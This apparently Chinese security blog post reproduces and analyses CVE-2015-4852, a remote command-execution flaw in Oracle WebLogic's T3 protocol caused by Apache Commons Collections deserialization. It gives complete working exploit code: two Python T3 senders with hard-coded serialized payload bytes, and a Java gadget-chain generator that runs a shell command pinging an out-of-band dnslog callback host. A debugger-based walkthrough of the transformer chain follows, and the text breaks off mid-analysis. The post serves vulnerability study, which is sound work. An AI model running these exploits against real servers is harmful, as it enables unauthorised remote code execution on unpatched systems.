<h4 id="1-漏洞本质"><a href="#1-漏洞本质" class="headerlink" title="1.漏洞本质"></a>1.漏洞本质</h4><p>​        该漏洞本质上是由Apache Commons Collections导致的反序列化漏洞，与weblogic实际无关，只是weblogic组件中正好用到了该库，且路径为\modules\com.bea.core.apache.commons.collections_3.2.0.jar。</p>
<h4 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h4><ul>
<li><h5 id="官方描述"><a href="#官方描述" class="headerlink" title="官方描述"></a>官方描述</h5><p>The WLS Security component in Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to execute arbitrary commands via a crafted serialized Java object in T3 protocol traffic to TCP port 7001, related to oracle_common/modules/com.bea.core.apache.commons.collections.jar. NOTE: the scope of this CVE is limited to the WebLogic Server product.</p>
</li>
<li><h5 id="对应中文"><a href="#对应中文" class="headerlink" title="对应中文"></a>对应中文</h5><p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0 和 12.2.1.0 中的 WLS 安全组件允许远程攻击者通过 T3 协议流量中精心设计的序列化 Java 对象执行任意命令，该对象与 oracle_common/modules/com.bea.core.apache.commons.collections.jar。注意：此 CVE 的范围仅限于 WebLogic Server 产品。</p>
</li>
<li><h5 id="可知信息"><a href="#可知信息" class="headerlink" title="可知信息"></a>可知信息</h5><p>漏洞影响的版本为：Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0 和 12.2.1.0</p>
<p>漏洞类型为：反序列化漏洞</p>
<p>漏洞代码发生位置：oracle_common/modules/com.bea.core.apache.commons.collections.jar</p>
</li>
</ul>
<h4 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h4><h5 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h5><p>漏洞exp一：(需配合ysoserial工具生成payload，具体命令见代码注释)</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port)</span>:</span></span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_address = (host, int(port))</span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(server_address)</span><br><span class="line">        <span class="comment"># Send headers</span></span><br><span class="line">        headers = <span class="string">'t3 12.2.1nAS:255nHL:19nn'</span>.format(port)</span><br><span class="line">        sock.sendall(headers)</span><br><span class="line">        data = sock.recv(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># java -jar ysoserial.jar CommonsCollections1 "touch /tmp/exp" &gt; ./tmp</span></span><br><span class="line">        f = open(<span class="string">'./tmp'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        payload_obj = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        payload1 = <span class="string">"000005ba016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">        payload3 = <span class="string">"aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774b210000000000000000000d31302e3130312e3137302e3330000d31302e3130312e3137302e33300f0371a20000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d01a621b7319cc536a1000a3137322e31392e302e32f7621bb50000000078"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">        payload2 = payload_obj</span><br><span class="line">        payload = payload1 + payload2 + payload3</span><br><span class="line"></span><br><span class="line">        payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">        sock.send(payload)</span><br><span class="line">        data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">u'socket 连接异常！'</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">exp(<span class="string">'192.168.22.137'</span>, <span class="number">7001</span>)</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>漏洞exp二：(Java代码生成payload,T3协议发送payload到目标服务器)</li>
</ul>
<ol>
<li><p>生成payload的代码：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cve_2015_4852</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        String cmd = <span class="string">"ping xys3si.dnslog.cn"</span>;</span><br><span class="line">        Transformer[] tarray = <span class="keyword">new</span> Transformer[]</span><br><span class="line">                {</span><br><span class="line">                        <span class="keyword">new</span> ConstantTransformer( Runtime<span class="class">.<span class="keyword">class</span> ),</span></span><br><span class="line">                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),</span><br><span class="line">                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br><span class="line">                        new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", cmd}})</span><br><span class="line">                };</span><br><span class="line">        Transformer tchain = <span class="keyword">new</span> ChainedTransformer( tarray );</span><br><span class="line">        Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate( normalMap, tchain );</span><br><span class="line">        Class clazz = Class.forName( <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span> );</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor( Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span> )</span>;</span><br><span class="line">        cons.setAccessible( <span class="keyword">true</span> );</span><br><span class="line">        InvocationHandler ih = ( InvocationHandler )cons.newInstance( Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span> )</span>;</span><br><span class="line">        Map mapProxy = ( Map ) Proxy.newProxyInstance</span><br><span class="line">                (</span><br><span class="line">                        Map<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                        new  Class[] { Map.class },</span><br><span class="line">                        ih</span><br><span class="line">                );</span><br><span class="line">        Object obj = cons.newInstance( Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span> )</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"CVE_2015_4852.ser"</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>发送payload到目标服务器代码(有时候可能需要修改headers中的版本才能发送成功)</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Usage: python %s &lt;host&gt; &lt;port&gt; &lt;/path/to/payload&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.settimeout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">server_address = (sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Connecting to %s port %s'</span> % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send headers</span></span><br><span class="line">headers=<span class="string">'t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending "%s"'</span> % headers</span><br><span class="line">sock.sendall(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'</span></span><br><span class="line">payload=payload+payloadObj</span><br><span class="line">payload=payload+<span class="string">'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adjust header for appropriate message length</span></span><br><span class="line">payload=struct.pack(<span class="string">'&gt;I'</span>,len(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] Sending payload...'</span></span><br><span class="line">sock.send(payload)</span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br></pre></td></tr></tbody></table></figure>

<h5 id="复现结果"><a href="#复现结果" class="headerlink" title="复现结果"></a>复现结果</h5><p>以漏洞exp2为例，利用漏洞向目标服务器发送payload后的执行结果如下图所示。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">payload执行的命令为ping xys3si.dnslog.cn</span></span><br><span class="line">python2 weblogic_t3.py 192.168.22.137 7001 CVE_2015_4852.ser</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/754158022/image-20210616164435430.png" alt="image-20210616164435430"></p>
</li>
</ol>
<h4 id="4-原理分析"><a href="#4-原理分析" class="headerlink" title="4.原理分析"></a>4.原理分析</h4><h5 id="4-1-分析sink触发点"><a href="#4-1-分析sink触发点" class="headerlink" title="4.1 分析sink触发点"></a>4.1 分析sink触发点</h5><p>接下来跟进代码对漏洞进行分析，因为我们已经定位该漏洞所在的jar包，因此直接将该jar包添加为库，发送exp启用远程调试进行分析。</p>
<p><img src="/posts/754158022/image-20210616171954782.png" alt="image-20210616171954782"></p>
<p>首先分析sink点函数，在<code>Collections</code>组件中提供了一个非常重要的类: <code>org.apache.commons.collections.functors.InvokerTransformer</code>，这个类实现了:<code>java.io.Serializable</code>接口。</p>
<p><img src="/posts/754158022/image-20210616172447432.png" alt="image-20210616172447432"></p>
<p><code>InvokerTransformer</code>类同时也实现了<code>org.apache.commons.collections.Transformer</code>接口,<code>Transformer</code>提供了一个对象转换方法：<code>transform</code>，主要用于将输入对象转换为输出对象。<code>InvokerTransformer</code>类的主要作用就是利用Java反射机制来创建类实例。</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//input为我们可控的类，payload中传入了java.lang.Runtime</span></span><br><span class="line">Class cls = input.getClass();</span><br><span class="line"><span class="comment">//反射获取方法名，其中iMethodName为方法名，iParamTypes为该方法的参数类型</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="comment">//反射执行方法，iArgs为具体执行的命令，for example:ping XXX</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></tbody></table></figure>

<p>由上可知，我们可以通过<code>InvokerTransformer</code>的构造方法，传入我们想要的某个类的方法名，参数类型，具体的参数值，从而执行相应的方法，构造函数如下：</p>
<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>{</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//payload中的使用方法</span></span><br><span class="line">new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),</span><br><span class="line">new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br><span class="line">new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", cmd}})</span><br></pre></td></tr></tbody></table></figure>

<p>因为我们要执行的方法属于java.lang.Runtime类对象，因此首先需要传入的便是java.lang.Runtime这个类对象，<code>ConstantTransformer</code>类是<code>Transformer</code>接口的实现类，其中<code>ConstantTransformer</code>类重写了接口类的<code>transformer</code>方法</p>
<p><img src="/posts/754158022/image-20210617102302328.png" alt="image-20210617102302328"></p>
<p>对应payload为：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> ConstantTransformer( Runtime<span class="class">.<span class="keyword">class</span> )</span></span><br></pre></td></tr></tbody></table></figure>

<p>通过<code>ConstantTransformer</code>类的<code>transform</code>方法获取一个对象类型，如<code>transform</code>参数是<code>Runtime.class</code>时，调用<code>ConstantTransformer</code>类的<code>transform</code>方法，执行后返回<code>java.lang.Runtime</code>类</p>
<p><code>org.apache.commons.collections.functors.ChainedTransformer</code>类实现了<code>Transformer</code>链式调用，我们只需要传入一个<code>Transformer</code>数组<code>ChainedTransformer</code>就可以实现依次的去调用每一个<code>Transformer</code>的<code>transform</code>方法。</p>
<p><img src="/posts/754158022/image-20210617103415942.png" alt="image-20210617103415942"></p>
<p>对应payload为：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">Transformer[] tarray = <span class="keyword">new</span> Transformer[]</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer( Runtime<span class="class">.<span class="keyword">class</span> ),</span></span><br><span class="line">    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),</span><br><span class="line">    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),</span><br><span class="line">    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", cmd}})</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<h5 id="4-2-ChainedTransformer的transform下断点分析"><a href="#4-2-ChainedTransformer的transform下断点分析" class="headerlink" title="4.2 ChainedTransformer的transform下断点分析"></a>4.2 <code>ChainedTransformer</code>的<code>transform</code>下断点分析</h5><p>因此，第一次我们在<code>transform</code>下断点，跟进代码流程如下：</p>
<p><img src="/posts/754158022/image-20210617103949123.png" alt="image-20210617103949123"></p>
<p>下一步,input为entrySet的值，返回的object的值是java.lang.Runtime</p>
<p><img src="/posts/754158022/image-20210617104048237.png" alt="image-20210617104048237"></p>
<p>下一步，i的值+1，Object为java.lang.Runtime，进入<code>InvokerTransformer</code>的<code>transform</code>方法，判断input是否为空，此处不为空，所以进入else所在语句，下一步；</p>
<p><img src="/posts/754158022/image-20210617104804045.png" alt="image-20210617104804045"></p>
<p>方法名getMethod，传入参数类型为String.class, Class[].class，通过method.invoke方法，相当于执行下面的语句</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">method = java.lang.Runtime.getMethod("getMethod",new Class[]{String.class, Class[].class})</span><br><span class="line">method.invoke(java.lang.Runtime,<span class="keyword">new</span> Object[]{<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]})    </span><br><span class="line"><span class="comment">//等价于：</span></span><br><span class="line">java.lang.Runtime.getMethod(<span class="keyword">new</span> Object[]{<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]})</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/754158022/image-20210617105102893.png" alt="image-20210617105102893"></p>
<p>继续跟进，i的值为2,object的值已经变成了java.lang.Runtime.getRuntime()</p>
<p><img src="/posts/754158022/image-20210617105922549.png" alt="image-20210617105922549"></p>
<p>相当于执行了下面的语句</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">method = java.lang.Runtime.getRuntime().getMethod("invoke",new Class[]{Object.class, Object[].class})</span><br><span class="line">method.invoke(java.lang.Runtime.getRuntime(),<span class="keyword">new</span> Object[]{<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]})    </span><br><span class="line"><span class="comment">//等价于：</span></span><br><span class="line">java.lang.Runtime.getRuntime().invoke(<span class="keyword">new</span> Object[]{<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]})</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/754158022/image-20210617110134798.png" alt="image-20210617110134798"></p>
<p>经过上面的步骤就获取了Runtime的实例，同时i=3</p>
<p><img src="/posts/754158022/image-20210617111707092.png" alt="image-20210617111707092"></p>
<p>最后一次，获取exec方法，相当于执行下面的命令</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">method = runtime.getMethod(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[]{String[]<span class="class">.<span class="keyword">class</span>})</span></span><br><span class="line">method.invoke(runtime,new Object[]{new String[]{"/bin/bash", "-c", cmd}})    </span><br><span class="line"><span class="comment">//等价于：</span></span><br><span class="line">runtime.exec(<span class="keyword">new</span> Object[]{<span class="keyword">new</span> String[]{<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, cmd}})</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/754158022/image-20210617111842366.png" alt="image-20210617111842366"></p>
<p>最后，返回一个运行中的进程，执行了传入命令</p>
<p><img src="/posts/754158022/image-20210617112744335.png" alt="image-20210617112744335"></p>
<h5 id="4-3-分析如何触发sink调用链"><a href="#4-3-分析如何触发sink调用链" class="headerlink" title="4.3 分析如何触发sink调用链"></a>4.3 分析如何触发sink调用链</h5><p>现在我们已经使用<code>InvokerTransformer</code>创建了一个含有恶意调用链的<code>Transformer</code>类的对象，紧接着我们应该思考如何才能够将调用链窜起来并执行，即如何通过某个类的某个方法触发<code>transform()</code>方法。通过分析代码发现调用<code>transform()</code>方法有以下两个类：</p>
<ul>
<li>TransformedMap（setValue ==&gt; checkSetValue ==&gt; valueTransformer.transform(value)，请自行跟进代码）</li>
<li>LazyMap</li>
</ul>
<p>限于篇幅内容，由于commons collections的触发方法多种多样，感兴趣的读者可以研究ysoserial工具源码进行学习。本文主要从所使用的payload出发，以LazyMap为例进行讲解。</p>
<p><img src="/posts/754158022/image-20210617144453218.png" alt="image-20210617144453218"></p>
